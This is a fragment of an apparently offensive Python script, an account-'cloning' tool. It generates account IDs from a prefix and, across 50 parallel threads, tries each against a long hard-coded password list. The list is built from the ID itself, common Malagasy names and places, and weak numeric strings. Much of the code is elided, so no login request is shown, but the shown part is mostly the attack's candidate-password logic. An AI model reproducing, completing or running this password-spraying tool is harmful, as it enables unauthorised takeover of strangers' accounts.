...
def BD_CLONING():
    ...
    with tred(max_workers=50) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nantenaina','Nantenaina','Andoniaina','Rakoto','rakoto','andoniaina','Lalaina','lalaina','diamondra','Diamondra','mamisoa','Mamisoa','fitia','Fitia','nomena', 'nomena','Nomena','mamolava','vololona','Vololona','ferdinand','Ferdinand','joselain','Joselain','jehovah','Jehovah','richard','Richard','vadikely','Vadikely','mamakely','Mamakely','dadakely','Dadakely','Fiainana','fiainana','andry','michel','Michel','fanantenana','Fanantenana','madmax','Madmax','rakotomalala','Rakotomalala','rakotoarimanana','Rakotoarimanana','ragasy','Ragasy','solofo','Solofo','123456','michael','andriamihaja','Andriamihaja','anjarasoa','domoina','12345','Domoina','Anjarasoa','finaritra','Finaritra','mamanay','Mamanay','dadanay','Dadanay','zanako','Zanako','sarobidy','Sarobidy','bekoto','Bekoto','dahalo','Dahalo','valisoa','Valisoa','narindra','Narindra','daniela','Daniela','chérie','Chérie','faniriana','Faniriana','madagasikara','Madagasikara','lalatiana','Lalatiana','sarah','Sarah','fabien','Fabien','Fanomezantsoa','fanomezantsoa','Frédéric','frédéric','volatiana','Volatiana','fandresena','Fandresena','faniry','Faniry','fehizoro','Fehizoro','mivady','Mivady','fanomezana','Fanomezana','martine','Martine','nirina','Nirina','radonirina','erik manana','deliance','Deliance','dokotera','Dokotera','Aina','aina','rasoa','Rasoa','Tiavina','tiavina','zazakely','Zazakely','sarindra','Sarindra','nandrianina','Nandrianina','Lanto','mahefa','Mahefa','miora','Miora','maraina','Maraina','hariva','Hariva','mimoza','Mimoza','safidiniaina','Safidiniaina','anthonio','Anthonio','Anjara','anjara','andry rajoelina','Andry rajoelina','siteny','Siteny','Mahery','mahery','kimaso','kaylelena','sodoma','Sodoma','mahamasina','Mahamasina','tahinaa','Tahiana','analakely','Analakely','ambanidia','Ambanidia','gendarme','Gendarme','polisy','Polisy','william','William','niaina','Niaina','marion','Marion','fenohasina','Fenohasina','lahatra','Lahatra','rakotoson','Rakotoson','maholy','Maholy','mamitiana','Mamitiana','mbolatiana','Mbolatiana','nambinina','Nambinina','rindra','Rindra','sahaza','Sahaza','saholy','Saholy','sahondra','Sahondra','santatra','Santatra','tsiresy','Tsiresy','tsiferana','Tsiferana','fenosoa','Fenosoa']
